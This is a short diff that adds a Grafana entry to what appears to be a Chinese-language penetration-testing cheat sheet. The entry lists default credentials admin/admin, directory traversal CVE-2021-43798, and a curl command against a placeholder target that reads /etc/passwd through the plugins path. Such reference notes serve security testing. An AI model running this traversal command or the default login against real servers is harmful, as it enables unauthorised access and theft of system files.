@@ -1,1 +1,4 @@
-未授权，ssrf
+Grafana (3000)
+默认账号: admin/admin
+漏洞: 目录遍历(CVE-2021-43798)
+curl http://target:3000/public/plugins/.../../../../../../../etc/passwd
